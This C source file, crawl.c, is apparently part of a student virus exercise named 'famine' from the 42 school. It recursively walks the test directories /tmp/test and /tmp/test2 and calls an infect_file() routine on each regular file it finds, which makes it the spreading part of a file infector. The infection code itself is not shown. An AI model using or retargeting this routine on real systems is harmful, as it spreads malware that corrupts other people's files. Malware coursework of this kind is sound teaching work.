/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   crawl.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/13 17:53:33 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/19 11:06:40 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <string.h>
#include <stdlib.h>
#include <dirent.h>

/*
	Crawls the directory given by path
	If it finds a directory, it calls crawl_dir() recursively to explore it
	If it finds a file, it will try to infect it by calling infect_file()

	@param path path to targeted directory
	@param ctx context used mainly for argv/envp
*/
static int	crawl_dir(const char *path, t_exec_ctx *ctx)
{
	struct dirent	*dirent = NULL;
	DIR				*dir = opendir(path);
	if (!dir)
		return (-1);

	do
	{
		dirent = readdir(dir);
		if (dirent)
		{
			if (!strcmp(dirent->d_name, ".") || !strcmp(dirent->d_name, ".."))
				continue ;

			char	*path_next = strjoin(path, "/");
			if (path_next == NULL)
				goto _fn_error;

			char	*new_path = strjoin(path_next, dirent->d_name);
			free(path_next);
			if (new_path == NULL)
				goto _fn_error;

			if (dirent->d_type == DT_DIR)
			{
				if (crawl_dir(new_path, ctx) == -1)
					goto _loop_error;
			}
			else
			{
				if (infect_file(ctx, new_path) == -1)
					goto _loop_error;
			}

			free(new_path);
			goto _loop_end;

			_loop_error:
			free(new_path);
			goto _fn_error;
		}
		_loop_end:;
	} while (dirent);
	closedir(dir);
	return (0);

	_fn_error:
	closedir(dir);
	return (-1);
}

int	crawl(t_exec_ctx *ctx)
{
	const char	*TARGET_DIRS[] = {
		"/tmp/test",
		"/tmp/test2"
	};
	const uint64_t	DIRS_COUNT = sizeof(TARGET_DIRS) / sizeof(char *);

	for (size_t i = 0; i < DIRS_COUNT; i++)
		if (crawl_dir(TARGET_DIRS[i], ctx) == -1)
			return (-1);
	return (0);
}
